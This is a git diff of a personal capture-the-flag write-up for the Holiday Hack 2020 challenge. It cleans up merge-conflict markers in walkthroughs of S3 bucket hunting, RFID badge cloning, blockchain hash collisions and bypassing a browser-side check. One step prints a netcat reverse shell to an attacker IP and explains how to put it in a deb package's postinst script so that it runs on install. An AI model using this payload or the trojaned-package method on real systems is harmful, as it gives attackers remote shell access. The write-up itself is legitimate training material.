@@ -44,15 +44,11 @@ This is the first stop in the Holiday Hack 2020 Challenge! Talk to Jingle Ringle
 I found it helpful to zoom in and then use the "Rectangle Select" tool. You can go right to "Filter >> Distort >> Twirl" once you have the area you'd like to focus on. It seems the best result comes when you try several different selected areas, starting from scratch each time. With every new selected area, see if the 'twirl' tool shows you some clarity right away. If it does, then you have only slightly more you need to do on the slider to see which item Santa plans to give Josh Wright. 
 
 ![](screenshots/proxmark-smaller.png)
->>>>>>> bba726306f256179f548b25f062c3f4a11e4c522
 
 **Lessons Learned**
 
 - Photo obfuscation can actually be 'undone' in some cases.
-<<<<<<< HEAD
-=======
 - When working with image editing "distort" filter tools, picking the correct "selection" area is half the battle.
->>>>>>> bba726306f256179f548b25f062c3f4a11e4c522
 
 # Objective 2: Investigate S3 Bucket
 
@@ -98,7 +94,6 @@ When you unwrap the over-wrapped file, what text string is inside the package? T
 **Lessons Learned** 
 
 - Automation does wonders when comes time to look for publicly exposed s3 buckets.
->>>>>>> bba726306f256179f548b25f062c3f4a11e4c522
 - There may be more public buckets lurking than you realize. And, holy cow, there are lots of ways to compress files!
 
 # Objective 3: Point-of-Sale Password Recovery
@@ -141,11 +136,7 @@ Talk to Pepper Minstix in the entryway to get some hints about the Santavator.
 
 Got some help from my kid on this one. :) 
 
-<<<<<<< HEAD
-![](screenshots/elevator.png)
-=======
 ![](screenshots/santavator.png)
->>>>>>> bba726306f256179f548b25f062c3f4a11e4c522
 
 **Lessons Learned**
 
@@ -157,13 +148,10 @@ Open the HID lock in the Workshop. Talk to Bushy Evergreen near the talk tracks 
 
 ![](screenshots/objective-5-completed.jpg)
 
-<<<<<<< HEAD
-=======
 Get this tool!
 
 ![](screenshots/proxmark-cli.png)
 
->>>>>>> bba726306f256179f548b25f062c3f4a11e4c522
 - Step 1: Steal Shinny Upatree's ID, using "search lf" when standing next to him.
 - Step 2: Simulate the ID when you get to Santa's secret door in the workshop.
         - "lf hid sim -r 2006e22f13" 
@@ -184,11 +172,7 @@ Access the Splunk terminal in the Great Room. What is the name of the adversary 
 
 **Answer:** "The Lollipop Guild"
 
-<<<<<<< HEAD
-rake sure you are "Santa" when you attempt this objective.
-=======
 Make sure you are "Santa" when you attempt this objective.
->>>>>>> bba726306f256179f548b25f062c3f4a11e4c522
 
 ## Question 1
 
@@ -475,12 +459,8 @@ pub/jfrost/backdoor/
 nc -e /bin/sh ATTACKING-IP 4444
 ~~~
 
-<<<<<<< HEAD
-- Step 8: Build the deb package with the above payload in the "postinst"
-=======
 - Step 8: Build the deb package with the above payload in the "postinst". *Note: that one payload line is ALL you need in the postinst file; nothing else!"*
 
->>>>>>> bba726306f256179f548b25f062c3f4a11e4c522
 	- "dpkg -x [debfile] work"
 	- "mkdir work/DEBIAN"
  	- "cd DEBIAN"
@@ -543,7 +523,6 @@ This required going into developer mode in Google Chrome. I saw one spot where t
 - Step 5: Now resume code execution in developer mode and you float right on by the logic that checks if you are Santa!
 
 These were tricks I learned from a BBKing/Black Hills Information Security webcast. Highly recommend! 
->>>>>>> bba726306f256179f548b25f062c3f4a11e4c522
 
 ![](screenshots/remove-besanta-condition.png)
 
@@ -629,19 +608,11 @@ Here's the final script that retrieves he predicted values:
 
 # Objective 11b: Naughty/Nice List with Blockchain Investigation Part 2
 
-<<<<<<< HEAD
-![](screenshots/objective-11b-completed.jpg)
-
-The SHA256 of Jack's altered block is: 58a3b9335a6ceb0234c12d35a0564c4e f0e90152d0eb2ce2082383b38028a90f. If you're clever, you can recreate the original version of that block by changing the values of only 4 bytes. Once you've recreated the original block, what is the SHA256 of that block?
-
-Answer: **fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb**
-=======
 The SHA256 of Jack's altered block is: 58a3b9335a6ceb0234c12d35a0564c4e f0e90152d0eb2ce2082383b38028a90f. If you're clever, you can recreate the original version of that block by changing the values of only 4 bytes. Once you've recreated the original block, what is the SHA256 of that block?
 
 ![](screenshots/objective-11b-completed.jpg)
 
 **Answer:** fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb
->>>>>>> bba726306f256179f548b25f062c3f4a11e4c522
 
 - Step 1: Create a script to show MD5 and SHA256 hashes on changes to the blockchain.dat file.
 
@@ -738,15 +709,6 @@ score:            4294967295
 previous hash:    4a91947439046c2dbaa96db38e924665
 hash:             347979fece8d403e06f89f8633b5231a
 
-<<<<<<< HEAD
-full hash:        
-b10b4a6bd373b61f32f4fd3a0cdfbf84 
-MD5 after changes (SAME AS BEFORE! COLLISION=SUCCESS!)
-
-full hash sha256: 
-fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb 
-SHA256 after changes and answer to objective!
-=======
 ***********************************************************
 + full hash:                                              +
 + b10b4a6bd373b61f32f4fd3a0cdfbf84                        + 
@@ -758,7 +720,6 @@ SHA256 after changes and answer to objective!
 + fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb +
 + SHA256 after changes and ANSWER to objective!                    +
 ********************************************************************
->>>>>>> bba726306f256179f548b25f062c3f4a11e4c522
 
 ~~~
 
@@ -796,10 +757,7 @@ All the rotting, plotting, low conniving streaming from that skull.
 Holiday Hackers, they're no slackers, returned Jack a big, old null!
 ~~~
 
-<<<<<<< HEAD
-=======
 ![](screenshots/balcony.png)
->>>>>>> bba726306f256179f548b25f062c3f4a11e4c522
 
 # Challenges
 	
